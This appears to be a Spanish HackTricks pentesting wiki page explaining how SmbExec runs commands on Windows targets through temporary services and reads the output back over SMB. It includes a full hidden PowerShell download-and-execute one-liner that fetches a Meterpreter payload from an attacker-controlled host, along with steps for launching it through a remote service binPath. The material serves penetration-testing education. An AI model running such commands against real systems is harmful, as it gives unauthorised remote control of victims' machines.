# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## ¿Cómo funciona?

**Smbexec funciona como Psexec.** En este ejemplo, **en lugar** de apuntar el "_binpath_" a un ejecutable malicioso dentro de la víctima, vamos a **apuntarlo** a **cmd.exe o powershell.exe** y uno de ellos descargará y ejecutará la puerta trasera.

## **SMBExec**

Veamos qué sucede cuando se ejecuta smbexec mirándolo desde el lado del atacante y del objetivo:

![](../../.gitbook/assets/smbexec\_prompt.png)

Así que sabemos que crea un servicio "BTOBTO". Pero ese servicio no está presente en la máquina objetivo cuando hacemos una `sc query`. Los registros del sistema revelan una pista de lo que sucedió:

![](../../.gitbook/assets/smbexec\_service.png)

El nombre del archivo de servicio contiene una cadena de comando para ejecutar (%COMSPEC% apunta a la ruta absoluta de cmd.exe). Imprime el comando a ejecutar en un archivo bat, redirige la salida estándar y de error a un archivo Temp, luego ejecuta el archivo bat y lo elimina. De vuelta en Kali, el script de Python luego extrae el archivo de salida a través de SMB y muestra el contenido en nuestra "pseudo-shell". Para cada comando que escribimos en nuestra "shell", se crea un nuevo servicio y se repite el proceso. Es por eso que no necesita dejar un binario, simplemente ejecuta cada comando deseado como un nuevo servicio. Definitivamente más sigiloso, pero como vimos, se crea un registro de eventos para cada comando ejecutado. ¡Todavía es una forma muy inteligente de obtener una "shell" no interactiva!

## SMBExec manual

**O ejecución de comandos a través de servicios**

Como smbexec demostró, es posible ejecutar comandos directamente desde los binPaths del servicio en lugar de necesitar un binario. Este puede ser un truco útil para tener en tu bolsillo si necesitas ejecutar solo un comando arbitrario en una máquina Windows objetivo. Como ejemplo rápido, obtengamos una shell de Meterpreter usando un servicio remoto _sin_ un binario.

Usaremos el módulo `web_delivery` de Metasploit y elegiremos un objetivo de PowerShell con un payload inverso de Meterpreter. Se configura el oyente y nos dice el comando a ejecutar en la máquina objetivo:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
```
Desde nuestra máquina de ataque de Windows, creamos un servicio remoto ("metpsh") y establecemos el binPath para ejecutar cmd.exe con nuestra carga útil:

![](../../.gitbook/assets/sc_psh_create.png)

Y luego lo iniciamos:

![](../../.gitbook/assets/sc_psh_start.png)

Da un error porque nuestro servicio no responde, pero si miramos nuestro listener de Metasploit, vemos que se hizo la llamada de retorno y se ejecutó la carga útil.

Toda la información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
